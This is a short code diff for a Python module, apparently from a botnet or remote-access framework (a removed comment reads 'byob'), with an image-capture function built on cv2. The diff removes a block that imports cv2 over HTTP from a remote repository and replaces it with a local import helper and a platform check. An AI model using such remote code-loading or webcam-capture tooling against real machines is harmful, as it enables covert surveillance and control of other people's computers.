@@ -14,21 +14,17 @@ import time
 import pickle
 import socket
 import struct
-import httpimport
 
-# byob
+# modules
 
 import util
 
-# remote imports
+# globals
 
-with httpimport.remote_repo(['cv2'], base_url='http://localhost:8000'):
-    try:
-        import cv2
-    except ImportError:
-        util.debug("Error: unable to import '%s'" % 'cv2')
-
-
+packages  = ['cv2']
+platforms = ['win32','linux2','darwin']
+util.is_compatible(platforms, __name__)
+util.imports(packages)
 
 def image(*args, **kwargs):
     try:
